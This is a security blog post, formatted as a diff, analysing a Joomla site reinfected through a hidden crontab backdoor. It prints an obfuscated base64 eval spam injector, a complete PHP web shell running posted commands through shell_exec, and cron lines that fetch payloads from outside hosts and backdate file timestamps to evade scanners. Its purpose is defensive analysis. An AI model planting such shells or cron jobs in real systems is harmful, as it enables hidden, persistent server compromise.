@@ -1,0 +1,28 @@
+The Hidden Backdoors to the City of Cron
+
+An attacker’s key to creating a profitable malware campaign is persistence. Malicious code that is easily detected and removed will not generate enough value for the attacker. This is the reason why we are seeing more and more malware using creative backdoor techniques, different obfuscation methods, and using unique approaches to increase the lifespan of any given attack.
+Today we found this malware; a simple, but heavily encoded SPAM injector that was prepended to a valid Joomla File. Yes, nothing new, we have thousands of blog posts that show this kind of malware:
+
+$stg="ba"."se"."64_d"."ecode";eval ($stg("JHNlcnZlcl91c2VyX2FnZW50ICAgID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNlcnZlcl9yZWZlcmVyICAgICAgID0gQCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiRzZXJ2ZXJfZm9yd2FyZGVkX2ZvciA9IEAkX1N....
+
+Not to be left lonely, it had a companion. A good old PHP shell to give the attacker “permanent” access to the server:
+if( $_POST["_cmd"] ) { $output = shell_exec ($_POST["_cmd"]); echo "<input type="hidden" name="output" value="'; echo $output; echo '">'; }
+
+Again, nothing new.
+Crontab Backdoor
+Finding and removing this malicious code was pretty easy, but the problem was that in less than 10 minutes the site was reinfected again.
+Since the website was running an old and vulnerable Joomla version, and the client wasn’t able to update it due to some compatibility issues, she moved to our Website Firewall so all those vulnerabilities could be protected by our virtual patching until the update.
+The client also changed all her passwords, so we thought everything was good.
+However, some minutes after the cleanup, the site was reinfected again. The same files were hit again, with the same behavior. We checked the CloudProxy logs and nothing passed through it. The FTP logs were clean as well. What was going on?
+We started monitoring the infection to understand its behavior, tracking how long would it take to happen again, which files were modified, and if we were missing any other hidden backdoor that could be responsible for this.
+Then we had a light bulb moment! Why don’t we check Crontab? Obvious, right? The Crontab file holds scheduled commands, known as cron jobs. Here’s what we found:
+*/3 * * * * chmod 0755 /home3/infectedsite/public_html/libraries/joomla/utilities/compat/compat.php; wget http://  www.xxx  .com/wdc.txt -O /home3/infectedsite/public_html/libraries/joomla/utilities/compat/compat.php >/dev/null;
+* */6 * * * wget http://  www.xxx  .com/PDF/rbkvgqdyle.txt -O /home3/infectedsite/public_html/libraries/simplepie/idn/7cuyng9o1a.php >/dev/null; fetch -o /home3/infectedsite/public_html/libraries/simplepie/idn/7cuyng9o1a.php http://  www.hestonsflorist  .com/PDF/rbkvgqdyle.txt >/dev/null 2>&1; touch -t 201104202045 /home3/infectedsite/public_html/libraries/simplepie/idn/index.html >/dev/null; chmod 0755 /home3/infectedsite/public_html/libraries/simplepie/idn/.htaccess >/dev/null; rm /home3/infectedsite/public_html/libraries/simplepie/idn/.htaccess >/dev/null; touch -t 201104202045 /home3/infectedsite/public_html/libraries/simplepie/idn/.; touch -t 201104202045 /home3/infectedsite/public_html/libraries/simplepie/idn/7cuyng9o1a.php >/dev/null
+
+That’s our backdoor!
+Dissecting the Cron Job
+The first job is set to run every 3 minutes (*/3 * * * *) and it is responsible for keeping the spam injection installed. It’s being done by changing the permissions in compat.php to 0755, then downloading an infected version from another compromised website and replacing the original file.
+Using wget and fetch, it downloads and installs the backdoor every 6 hours. To hide this backdoor from scanners that rely on timestamps, it “touches” the file and its directory to change its timestamp to 04/20/2011 – 20:45. It also removes any .htaccess file that would prevent direct access to PHP files.
+Conclusion
+This is not the first website we’ve seen with this Cron backdoor. On the same day we found another WordPress site with a similar infection. This seems to be a growing trend lately.
+If you ever run into any reinfections case that you can’t find where it is coming from, check the integrity of your server and Cron/At jobs, you might find a threat!
